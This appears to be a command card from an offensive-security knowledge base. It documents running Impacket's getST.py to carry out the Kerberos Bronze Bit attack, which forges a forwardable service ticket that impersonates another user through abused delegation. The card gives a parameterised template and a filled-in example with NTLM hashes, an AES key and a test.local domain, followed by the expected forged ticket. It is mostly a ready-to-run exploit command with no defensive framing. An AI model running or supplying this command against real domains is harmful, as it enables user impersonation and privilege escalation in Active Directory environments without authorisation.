---
type: command
executor: python
data: >-
  python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate
  User2 -hashes
  830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey
  2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc
  test.local/AttackerService$ -force-forwardable -dc-ip <DC_IP>
tags:
  - kerberos
  - bronze-bit
  - impacket
platforms:
  - Linux
  - Windows
verified: true
validated: true
---

# python-getst-py-bronze-bit-execution

## Command

```python
python .\impacket\examples\getST.py -spn $_SPN -impersonate $_USER -hashes $_LM_HASH:$_NTLM_HASH -aesKey $_AES_KEY $_DOMAIN/$_MACHINE$ -force-forwardable -dc-ip $_DC_IP
```

## Description

Executes the core Bronze Bit forging by requesting a forwardable ticket via the abused delegation chain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -spn $_SPN | Target SPN | Yes |
| -impersonate $_USER | Impersonated user | Yes |
| -hashes $_HASHES | Account hashes | Yes |
| -aesKey $_AES_KEY | AES key | Yes |
| $_DOMAIN/$_MACHINE$ | Domain and rogue machine | Yes |
| -force-forwardable | Enable forging | Yes |
| -dc-ip $_DC_IP | DC IP | Yes |

## Examples

### Basic Usage

```python
python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 test.local/AttackerService$ -force-forwardable
```

## Expected Output

TGS ticket file (e.g., User2.ccache) with forged forwardable flag.

## Related

- [[procedures/Kerberos-Bronze-Bit-Attack]]
- [[commands/python-getst-py-request-forwardable-ticket]]
